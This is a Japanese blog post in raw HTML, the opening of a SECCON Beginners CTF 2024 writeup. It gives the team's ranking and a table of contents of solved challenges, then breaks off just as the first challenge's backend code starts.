<!DOCTYPE html><html lang="ja"><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style data-href="/styles.e71379dda153709d1a9a.css" id="gatsby-global-css">html{font-size:100}body{margin:0 0 0 calc(100vw - 100%);color:#222;line-height:1.4;font-size:.875rem;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;background-color:#fcfcfc}body,h1,h2,h3,h4,h5,h6{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif}h1,h2,h3,h4,h5,h6{font-weight:600}h1{font-size:1.575rem;line-height:2.25rem;margin-top:5rem;margin-bottom:1.25rem}h2{font-size:1.47656rem;line-height:1.875rem}h2,h3{margin-top:2.5rem;margin-bottom:.625rem}h3{font-size:1.20313rem;line-height:1.25rem}h4{font-size:1.05rem;margin-top:1.875rem}h4,h5{line-height:1.25rem;margin-bottom:.625rem}h5,h6{font-size:.875rem;margin-top:3.125rem}h6{line-height:1.25rem;margin-bottom:.625rem}img{max-width:100%;margin:inherit auto}hr,img{border:0;display:block}hr{color:#222;height:1.625rem;margin:3.25rem auto;background-size:100% 26px;background-image:linear-gradient(180deg,transparent 1px,transparent 11px,#222 0,#222 15px,transparent 0,transparent 26px);width:6.25rem}a{color:#918d40;text-decoration:none}a:active,a:focus,a:hover{color:#a9d159}b,strong{font-weight:600}ul{list-style:square;margin-bottom:1.25rem}ul li{padding:0 .3125rem;margin-bottom:.625rem}p{line-height:1.25rem;margin-bottom:1.25rem}blockquote{font-style:italic;text-align:center;background-color:#f5f5f5;padding:.1875rem .625rem}figure{display:block;width:100%;height:auto}figcaption{line-height:.9375rem;margin-top:.3125rem;color:#222;font-size:.75rem;font-style:italic;margin-bottom:0;text-align:center}.anchor{margin-left:-1.875rem!important;padding-right:.875rem!important}@media screen and (min-width:685px){figure.float-left,figure.float-right{max-width:19.375rem;padding:0 1.25rem}.float-right{float:right}.float-left{float:left}}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#999}.token.punctuation{color:#ccc}.token.attr-name,.token.deleted,.token.namespace,.token.tag{color:#e2777a}.token.function-name{color:#6196cc}.token.boolean,.token.function,.token.number{color:#f08d49}.token.class-name,.token.constant,.token.property,.token.symbol{color:#f8c555}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector{color:#cc99cd}.token.attr-value,.token.char,.token.regex,.token.string,.token.variable{color:#7ec699}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}li>code[class*=language-text],p>code[class*=language-text]{background:#f9f9f9!important;color:#2d2d2d!important}.Author-module--author__photo--36xCH{display:inline-block;margin-bottom:0;border-radius:50%;background-clip:padding-box}.Author-module--author__title--2CaTb{font-size:.98438rem;font-weight:600;line-height:1.40625rem;margin:.625rem 0}.Author-module--author__title-link--Yrism,.Author-module--author__title-link--Yrism:focus,.Author-module--author__title-link--Yrism:hover{color:#222}.Author-module--author__subtitle--cAaEB{color:#888;line-height:1.25rem;margin-bottom:1.25rem}.Icon-module--icon--Gpyvw{display:inline-block;width:1em;height:1em;stroke-width:0;stroke:currentColor;fill:currentColor;font-style:normal;font-weight:400;speak:none;margin-right:.2em;text-align:center;font-variant:normal;text-transform:none;line-height:1em;margin-left:.2em;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.Contacts-module--contacts--1rGd1{margin-bottom:1.25rem}.Contacts-module--contacts__list--3OgdW{display:flex;flex-flow:row wrap;flex-grow:0;flex-shrink:0;list-style:none;padding:0;margin:.625rem -.1875rem;width:8.75rem}.Contacts-module--contacts__list-item--16p9q{padding:0;margin:.25rem;display:flex;align-content:center;align-items:center;justify-content:center;height:2.1875rem;width:2.1875rem;line-height:2.1875rem;border-radius:50%;text-align:center;border:1px solid #ebebeb}.Contacts-module--contacts__list-item-link--2MIDn{border:0;display:flex;color:#222}.Contacts-module--contacts__list-item-link--2MIDn:focus,.Contacts-module--contacts__list-item-link--2MIDn:hover{color:#918d40}.Copyright-module--copyright--1ariN{color:#b6b6b6;font-size:.75rem}.Menu-module--menu--Efbin{margin-bottom:1.25rem}.Menu-module--menu__list--31Zeo{list-style:none;padding:0;margin:0}.Menu-module--menu__list-item--1lJ6B{padding:0;margin:.625rem 0}.Menu-module--menu__list-item-link--10Ush{font-size:.875rem;color:#222;font-weight:400;border:0}.Menu-module--menu__list-item-link--10Ush:focus,.Menu-module--menu__list-item-link--10Ush:hover{color:#918d40;border-bottom:1px solid #918d40}.Menu-module--menu__list-item-link--active--2CbUO{color:#222;border-bottom:1px solid #222}.Sidebar-module--sidebar--X4z2p{width:100%}.Sidebar-module--sidebar__inner--Jdc5s{position:relative;padding:1.5625rem 1.25rem 0}.Sidebar-module--headerimage--19Rdy{width:100%;min-height:70px;max-height:120px;margin:0 0 .625rem}.Sidebar-module--logo-image--XDYae{min-height:70px;max-height:120px;margin:0 auto}input{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:.625rem;margin:.3125rem 0;border:1px solid #999;border-radius:.3125rem}.Sidebar-module--search-container--17C6F{position:relative}.Sidebar-module--search-container-input--27Tw4{width:100%}.Sidebar-module--search-container-submit--WwtLg{position:absolute;width:2.375rem;height:2.375rem;top:calc(50% - 19px);right:0;border:3px solid #999;border-radius:0 .25rem .25rem 0;background:#999}.Sidebar-module--search-container-submit--WwtLg:before{position:absolute;content:"";width:.9375rem;height:.9375rem;top:calc(50% - 9px);left:calc(50% - 9px);border-radius:50%;box-shadow:0 0 0 2px #fff}.Sidebar-module--search-container-submit--WwtLg:after{position:absolute;content:"";width:.5rem;height:.375rem;top:calc(50% + 6px);left:calc(50% + 2px);border-top:2px solid #fff;transform:rotate(45deg)}@media screen and (min-width:685px){.Sidebar-module--sidebar--X4z2p{width:calc(41.625% - 1.09375rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(12n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(12n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:1.875rem 1.25rem 0}.Sidebar-module--sidebar__inner--Jdc5s:after{background:#e6e6e6;background:linear-gradient(180deg,#e6e6e6 0,#e6e6e6 48%,#fff);position:absolute;content:"";width:.0625rem;height:33.75rem;top:30px;right:-10px;bottom:0}}@media screen and (min-width:960px){.Sidebar-module--sidebar--X4z2p{width:calc(33.3% - 1.25rem)}.Sidebar-module--sidebar--X4z2p:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Sidebar-module--sidebar--X4z2p:last-child{margin-right:0}.Sidebar-module--sidebar--X4z2p:nth-child(3n){margin-right:0;float:right}.Sidebar-module--sidebar--X4z2p:nth-child(3n+1){clear:both}.Sidebar-module--sidebar__inner--Jdc5s{padding:2.5rem}}.Layout-module--layout--3Pyz6{max-width:66.875rem;margin-left:auto;margin-right:auto}.Layout-module--layout--3Pyz6:before{content:"";display:table}.Layout-module--layout--3Pyz6:after{content:"";display:table;clear:both}.Feed-module--feed__item--2D5rE{margin-bottom:1.5625rem}.Feed-module--feed__item--2D5rE:last-child{margin-bottom:.625rem}.Feed-module--feed__item-title--3nigr{font-size:1.47656rem;line-height:1.875rem;margin-top:0;margin-bottom:.625rem}.Feed-module--feed__item-title-link--iFMRs{color:#222}.Feed-module--feed__item-title-link--iFMRs:focus,.Feed-module--feed__item-title-link--iFMRs:hover{color:#222;border-bottom:1px solid #222}.Feed-module--feed__item-description--1uO8e{font-size:.875rem;line-height:1.25rem;margin-bottom:.9375rem}.Feed-module--feed__item-meta-time--3t1fg{font-size:.75rem;color:#222;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-divider--N-Q0A{margin:0 .3125rem}.Feed-module--feed__item-meta-category-link--23f8F{font-size:.75rem;color:#a9d159;font-weight:600;text-transform:uppercase}.Feed-module--feed__item-meta-category-link--23f8F:focus,.Feed-module--feed__item-meta-category-link--23f8F:hover{color:#918d40}.Feed-module--feed__item-readmore--1u6bI{font-size:.875rem;color:#918d40}.Feed-module--feed__item-readmore--1u6bI:focus,.Feed-module--feed__item-readmore--1u6bI:hover{color:#918d40;border-bottom:1px solid #918d40}.Page-module--page--2nMky{margin-bottom:2.5rem}.Page-module--page__inner--2M_vz{padding:1.5625rem 1.25rem}.Page-module--page__title--GPD8L{font-size:1.575rem;font-weight:600;line-height:2.5rem;margin-top:0;margin-bottom:1.8125rem}.Page-module--page__body--Ic6i6{font-size:.875rem;line-height:1.25rem;margin:0 0 1.25rem}@media screen and (min-width:685px){.Page-module--page--2nMky{width:calc(58.275% - .78125rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(12n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(12n+1){clear:both}.Page-module--page__inner--2M_vz{padding:1.875rem 1.25rem}}@media screen and (min-width:960px){.Page-module--page--2nMky{width:calc(66.6% - .625rem)}.Page-module--page--2nMky:nth-child(1n){float:left;margin-right:1.875rem;clear:none}.Page-module--page--2nMky:last-child{margin-right:0}.Page-module--page--2nMky:nth-child(3n){margin-right:0;float:right}.Page-module--page--2nMky:nth-child(3n+1){clear:both}.Page-module--page__inner--2M_vz{padding:2.5rem 2.1875rem}}.Pagination-module--pagination--2H3nO{margin-top:2.5rem;display:flex}.Pagination-module--pagination__prev--bet5s{width:50%;text-align:left}.Pagination-module--pagination__prev-link--1Nzs6{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__prev-link--1Nzs6:focus,.Pagination-module--pagination__prev-link--1Nzs6:hover{color:#918d40}.Pagination-module--pagination__prev-link--disable--Yklx9{pointer-events:none;color:#bbb}.Pagination-module--pagination__next--3hFiN{width:50%;text-align:right}.Pagination-module--pagination__next-link--3FUtA{color:#a9d159;font-size:1.625rem;font-weight:700}.Pagination-module--pagination__next-link--3FUtA:focus,.Pagination-module--pagination__next-link--3FUtA:hover{color:#918d40}.Pagination-module--pagination__next-link--disable--30UwZ{pointer-events:none;color:#bbb}.Author-module--author--2Yefr{border-top:1px solid #e6e6e6;max-width:43.75rem;padding-top:1.25rem;line-height:1.25rem;margin-top:1.25rem;margin-bottom:2.5rem}.Author-module--author__bio-twitter--n-O9n{display:block;text-decoration:underline}@media screen and (min-width:685px){.Author-module--author--2Yefr{margin-left:auto;margin-right:auto}}.Content-module--content--3p512{max-width:62.8125rem;padding:0 .9375rem;margin:0 auto}.Content-module--content__title--2BDW9{font-size:1.75rem;max-width:43.75rem;font-weight:600;text-align:center;line-height:2.0625rem;margin:1.25rem auto 0}.Content-module--content__body--2TrQ- figure{margin-bottom:1.25rem}.Content-module--content__body--2TrQ- figure blockquote{font-style:italic;text-align:center;margin-top:0;padding:1.25rem 0}.Content-module--content__body--2TrQ- figure blockquote p{max-width:43.75rem;font-size:1.47149rem;margin-top:1.25rem;margin-bottom:1.25rem;line-height:1.875rem}.Content-module--content__body--2TrQ- a{text-decoration:underline}.Content-module--content__body--2TrQ- *{max-width:43.75rem;margin-left:auto;margin-right:auto}.Content-module--content__body--2TrQ- img{max-width:100%;margin-top:.625rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- li ul{margin-bottom:.625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}.Content-module--content__body--2TrQ- h2{position:relative;padding:1rem 1.5rem;color:#fff;border-radius:.625rem;background:#0c0000}.Content-module--content__body--2TrQ- h2:after{position:absolute;bottom:-9px;left:1rem;width:0;height:0;content:"";border-color:#0c0000 transparent transparent;border-style:solid;border-width:10px 10px 0}.Content-module--content__body--2TrQ- h3{border-bottom:3px dotted #0c0000;padding:1rem 0}@media screen and (min-width:960px){.Content-module--content--3p512{padding:0}.Content-module--content__title--2BDW9{font-size:1.75rem;line-height:2.8125rem;margin-top:2.8125rem;margin-bottom:1.875rem}.Content-module--content__body--2TrQ-,.Content-module--content__body--2TrQ- p{font-size:.98438rem;line-height:1.40625rem;margin-bottom:1.40625rem}.Content-module--content__body--2TrQ- li p{line-height:1.25rem;margin-bottom:.625rem}}.Meta-module--meta__date--29eD7{font-style:italic}.Tags-module--tags--1L_ct{margin-bottom:.625rem}.Tags-module--tags__list--91FqN{list-style:none;margin:0 -.625rem;padding:0}.Tags-module--tags__list-item--1M30P{display:inline-block;margin:.625rem .3125rem}.Tags-module--tags__list-item-link--3SL_8{display:inline-block;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;border:1px solid #e6e6e6;text-decoration:none;border-radius:1.25rem;color:#222}.Tags-module--tags__list-item-link--3SL_8:focus,.Tags-module--tags__list-item-link--3SL_8:hover{color:#918d40}.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{max-width:43.75rem;margin:0 auto;padding:0 .9375rem}.Post-module--post__home-button--16Kl0{display:block;max-width:5.625rem;height:2.1875rem;padding:0 1.5rem;line-height:2.1875rem;text-align:center;color:#222;border:1px solid #e6e6e6;border-radius:1.25rem;font-size:.875rem;font-weight:400;margin-left:auto;margin-right:auto;margin-top:1.25rem}.Post-module--post__home-button--16Kl0:focus,.Post-module--post__home-button--16Kl0:hover{color:#918d40}@media screen and (min-width:960px){.Post-module--post__comments--25y6I,.Post-module--post__footer--3WzWU{padding:0}.Post-module--post__home-button--16Kl0{position:fixed;max-width:auto;margin:0;top:30px;left:30px}}</style><meta name="generator" content="Gatsby 2.32.13"/><link rel="alternate" type="application/rss+xml" title="かえるのひみつきち" href="/rss.xml"/><style type="text/css">
    .anchor.before {
      position: absolute;
      top: 0;
      left: 0;
      transform: translateX(-100%);
      padding-right: 4px;
    }
    .anchor.after {
      display: inline-block;
      padding-left: 4px;
    }
    h1 .anchor svg,
    h2 .anchor svg,
    h3 .anchor svg,
    h4 .anchor svg,
    h5 .anchor svg,
    h6 .anchor svg {
      visibility: hidden;
    }
    h1:hover .anchor svg,
    h2:hover .anchor svg,
    h3:hover .anchor svg,
    h4:hover .anchor svg,
    h5:hover .anchor svg,
    h6:hover .anchor svg,
    h1 .anchor:focus svg,
    h2 .anchor:focus svg,
    h3 .anchor:focus svg,
    h4 .anchor:focus svg,
    h5 .anchor:focus svg,
    h6 .anchor:focus svg {
      visibility: visible;
    }
  </style><script>
    document.addEventListener("DOMContentLoaded", function(event) {
      var hash = window.decodeURI(location.hash.replace('#', ''))
      if (hash !== '') {
        var element = document.getElementById(hash)
        if (element) {
          var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop
          var clientTop = document.documentElement.clientTop || document.body.clientTop || 0
          var offset = element.getBoundingClientRect().top + scrollTop - clientTop
          // Wait for the browser to finish rendering before scrolling.
          setTimeout((function() {
            window.scrollTo(0, offset - 0)
          }), 0)
        }
      }
    })
  </script><link rel="preconnect dns-prefetch" href="https://www.google-analytics.com"/><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-122086587-6"></script><script>
      
      
      if(true) {
        window.dataLayer = window.dataLayer || [];
        function gtag(){window.dataLayer && window.dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'UA-122086587-6', {"send_page_view":false});
      }
      </script><link rel="sitemap" type="application/xml" href="/sitemap.xml"/><link rel="icon" href="/favicon-32x32.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d" type="image/png"/><link rel="manifest" href="/manifest.webmanifest" crossorigin="anonymous"/><meta name="theme-color" content="#F7A046"/><link rel="apple-touch-icon" sizes="48x48" href="/icons/icon-48x48.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="72x72" href="/icons/icon-72x72.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="96x96" href="/icons/icon-96x96.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="144x144" href="/icons/icon-144x144.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="192x192" href="/icons/icon-192x192.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="256x256" href="/icons/icon-256x256.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="384x384" href="/icons/icon-384x384.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><link rel="apple-touch-icon" sizes="512x512" href="/icons/icon-512x512.png?v=a0f47f11c0e7e9c18dcf5ce2a040fc9d"/><title data-react-helmet="true">SECCON Beginners CTF 2024 Writeup - かえるのひみつきち</title><meta data-react-helmet="true" name="description" content="SECCON Beginners CTF 2024 の Writeup です。"/><meta data-react-helmet="true" property="og:site_name" content="SECCON Beginners CTF 2024 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" property="og:image" content="https://kashiwaba-yuki.com/static/d1cd078797f89a002356ff929739e47a/ctf-sec4b-2024.png"/><meta data-react-helmet="true" name="twitter:card" content="summary_large_image"/><meta data-react-helmet="true" name="twitter:title" content="SECCON Beginners CTF 2024 Writeup - かえるのひみつきち"/><meta data-react-helmet="true" name="twitter:description" content="SECCON Beginners CTF 2024 の Writeup です。"/><meta data-react-helmet="true" name="twitter:image" content="https://kashiwaba-yuki.com/static/d1cd078797f89a002356ff929739e47a/ctf-sec4b-2024.png"/><link as="script" rel="preload" href="/webpack-runtime-a3c0f166cb4b802ff58f.js"/><link as="script" rel="preload" href="/framework-3761df4ab6ee9f056936.js"/><link as="script" rel="preload" href="/532a2f07-92db97c0addf07d5cb73.js"/><link as="script" rel="preload" href="/dc6a8720040df98778fe970bf6c000a41750d3ae-e7946e47e6db7472d03a.js"/><link as="script" rel="preload" href="/app-d53f2c9203caf1f62836.js"/><link as="script" rel="preload" href="/styles-407fe62976dc5310c43e.js"/><link as="script" rel="preload" href="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js"/><link as="script" rel="preload" href="/component---src-templates-post-template-js-381c1b847824134fa4bd.js"/><link as="fetch" rel="preload" href="/page-data/ctf-sec4b-2024/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/251939775.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/401334301.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/825871152.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><div class="Layout-module--layout--3Pyz6"><div><a class="Post-module--post__home-button--16Kl0" href="/">All Articles</a><div><div class="Content-module--content--3p512"><h1 class="Content-module--content__title--2BDW9">SECCON Beginners CTF 2024 Writeup</h1><div class="Content-module--content__body--2TrQ-"><p>2024 年 6 月 15 日から開催されていた SECCON Beginners CTF 2024 に 0nePadding で参加していました。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/4c29019c115db331c70a25fe7b215f66/cdef6/image-20240616143310658.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 27.500000000000004%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAxUlEQVQY05WQ2Q7CIBRE+f9/01SNiTEuT42lrWDpItvtWOiiib54kxOGbbgDOxxPSDY7rNYbJMl20HsI+UCovu/xbzHO88FA4i4khBDgvMCjUnGTiKLpP7Bw6Vd5T0uXQXv6YJrPDxLNEFjTtlE45yLe+2hkjMUt48No3vGnLwjnK1VHtDaw1sFYG01ZXpTRSGuN50DQo6HB+XKFqpuv/wya8xJpmqEoBcq7hFLNGHlsmRbGSH7pNOy7af5JSNZ23ZJuXn8BG8XVZ45Kz78AAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/4c29019c115db331c70a25fe7b215f66/8ac56/image-20240616143310658.webp 240w,
/static/4c29019c115db331c70a25fe7b215f66/d3be9/image-20240616143310658.webp 480w,
/static/4c29019c115db331c70a25fe7b215f66/e46b2/image-20240616143310658.webp 960w,
/static/4c29019c115db331c70a25fe7b215f66/5231b/image-20240616143310658.webp 1163w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/4c29019c115db331c70a25fe7b215f66/8ff5a/image-20240616143310658.png 240w,
/static/4c29019c115db331c70a25fe7b215f66/e85cb/image-20240616143310658.png 480w,
/static/4c29019c115db331c70a25fe7b215f66/d9199/image-20240616143310658.png 960w,
/static/4c29019c115db331c70a25fe7b215f66/cdef6/image-20240616143310658.png 1163w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/4c29019c115db331c70a25fe7b215f66/d9199/image-20240616143310658.png"
            alt="image-20240616143310658"
            title="image-20240616143310658"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>最終順位 16 位 / 962 チームでした。</p>
<p>去年が 35 位だったので過去最高記録です。</p>
<p>今回は Rev に加えて Crypto や Pwn もいくつか解いたので簡単に Writeup を書きます。</p>
<!-- omit in toc -->
<h2 id="もくじ" style="position:relative;"><a href="#%E3%82%82%E3%81%8F%E3%81%98" aria-label="もくじ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>もくじ</h2>
<ul>
<li>
<p><a href="#assemblerev">assemble(Rev)</a></p>
<ul>
<li><a href="#%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E7%92%B0%E5%A2%83%E3%82%92%E7%94%A8%E6%84%8F%E3%81%99%E3%82%8B">ローカル環境を用意する</a></li>
<li><a href="#stage-1stage-2">Stage 1、Stage 2</a></li>
<li><a href="#stage-3">Stage 3</a></li>
<li><a href="#stage-4">Stage 4</a></li>
</ul>
</li>
<li><a href="#cha-ll-engerev">cha-ll-enge(Rev)</a></li>
<li>
<p><a href="#constructrev">construct(Rev)</a></p>
<ul>
<li><a href="#%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%83%A9%E3%82%A4%E3%83%B3%E5%BC%95%E6%95%B0%E3%81%AE%E6%9C%89%E7%84%A1%E3%82%92%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF">コマンドライン引数の有無をチェック</a></li>
<li><a href="#%E6%96%87%E5%AD%97%E6%95%B0%E3%81%8C-0x20-%E6%96%87%E5%AD%97%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B%E3%82%92%E6%A4%9C%E8%A8%BC">文字数が 0x20 文字かどうかを検証</a></li>
<li><a href="#%E5%85%A5%E5%8A%9B%E6%96%87%E5%AD%97%E3%82%92%E5%85%88%E9%A0%AD%E3%81%8B%E3%82%89-2-%E6%96%87%E5%AD%97%E3%81%9A%E3%81%A4%E6%A4%9C%E8%A8%BC">入力文字を先頭から 2 文字ずつ検証</a></li>
</ul>
</li>
<li><a href="#former-seccomprev">former-seccomp(Rev)</a></li>
<li><a href="#simpleoverflowpwn">simpleoverflow(Pwn)</a></li>
<li><a href="#simpleoverwritepwn">simpleoverwrite(Pwn)</a></li>
<li><a href="#pure-and-easypwn">pure-and-easy(Pwn)</a></li>
<li><a href="#safe-primecrypto">Safe Prime(Crypto)</a></li>
<li><a href="#mathcrypto">math(Crypto)</a></li>
<li><a href="#commentatormisc">commentator(Misc)</a></li>
<li><a href="#%E3%81%BE%E3%81%A8%E3%82%81">まとめ</a></li>
</ul>
<h2 id="assemblerev" style="position:relative;"><a href="#assemblerev" aria-label="assemblerev permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>assemble(Rev)</h2>
<blockquote>
<p>Intel記法のアセンブリ言語を書いて、flag.txtファイルの中身を取得してみよう!</p>
</blockquote>
<p>提供された URL にアクセスすると、こんな感じの WEB アプリケーションが起動します。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/76b3617e8f3a7b4bb8026a8313240a45/d56b5/image-20240616104309228.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 67.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB3klEQVQ4y6XSTU8TQRwG8CkxGlsE9mV2Z/a123bZ3XZpWhtDFAMp9oWXA/GACVw8+QG8oF/Akzc9EUw4ajx45K6Jn+vxP1uoVVEIHn5ps9l55pn/LGssN1GPM0g3hMElTMu5Fk7U+1J4eLu+hy/bz3G0OgLzghoU4YSwpT9lCZd4l7KdoGARQeKggTSMUXMjsKzVQZKuIMnahTjNESc5LfShUwPjd6bA4vwCFir3pirlCsrleSwZtmpYhx8Sahko9D8IIgjV0BJEFmxicgHbr6E13ke+czDV3j1Ea7RPjatg0vEhpAdOL6vdFZNwasOtGTbNTOdwsy423p3hyclXDD58w4B+h6ff0X9/BlFrgvG/DN0ohj5DPadNNWpx69FTsM4QLO+DrSibYK0NaDQmZp7fllo0CZOXugjUnQh3+weYe7AL1qVbvT8mWyh1BtBF8DOwWMjllYEaBd5Zf4ZSETieBPZ+CXSnR7rKRcPbdORSj4IopDh6d4i59uYkUDO08xbX+6BN26PQkJrOqkKXYbEpC6IRDI1uVTMJ/ydTs6BrNvRF/qclXoyO9XbewM1zkpDsxpxmCpO+XbZ6/AJrH4+w9unVzdDax59f4+HpS4i4AWZkdehp9P+SKgzh4AcMwZES5lYSOAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/76b3617e8f3a7b4bb8026a8313240a45/8ac56/image-20240616104309228.webp 240w,
/static/76b3617e8f3a7b4bb8026a8313240a45/d3be9/image-20240616104309228.webp 480w,
/static/76b3617e8f3a7b4bb8026a8313240a45/e46b2/image-20240616104309228.webp 960w,
/static/76b3617e8f3a7b4bb8026a8313240a45/34ce3/image-20240616104309228.webp 1215w"
              sizes="(max-width: 960px) 100vw, 960px"
              type="image/webp"
            />
          <source
            srcset="/static/76b3617e8f3a7b4bb8026a8313240a45/8ff5a/image-20240616104309228.png 240w,
/static/76b3617e8f3a7b4bb8026a8313240a45/e85cb/image-20240616104309228.png 480w,
/static/76b3617e8f3a7b4bb8026a8313240a45/d9199/image-20240616104309228.png 960w,
/static/76b3617e8f3a7b4bb8026a8313240a45/d56b5/image-20240616104309228.png 1215w"
            sizes="(max-width: 960px) 100vw, 960px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/76b3617e8f3a7b4bb8026a8313240a45/d9199/image-20240616104309228.png"
            alt="image-20240616104309228"
            title="image-20240616104309228"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>このアプリケーションのバックエンドは以下のコードで実装されています。</p>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">import</span> os
